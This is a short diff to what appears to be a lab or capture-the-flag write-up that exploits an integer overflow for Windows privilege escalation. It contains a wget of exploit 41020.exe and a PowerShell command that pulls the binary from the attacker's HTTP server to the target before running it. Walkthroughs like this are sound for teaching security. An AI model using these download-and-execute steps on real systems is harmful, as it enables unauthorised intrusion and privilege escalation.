@@ -100,7 +100,9 @@ Apparently this machine is vulnerable to an integer overflow.
 I downloaded the suggested exploit with $wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe into the http.server directory.  
 I then closed and started up a new http.server at a different port.  
 I messed around with a few variants of downloading via powershell and eventually this one worked:  
->powershell -c "(new-object System.Net.WebClient).DownloadFile('http://vpnIP:PORT/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"  
+{% highlight ruby %}
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://vpnIP:PORT/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"  
+{% endhighlight %}
 I then navigated to that directory and executred the new exploit.  
 I saw no special output in the shell, until I ran whoami.  
 {% highlight ruby %}
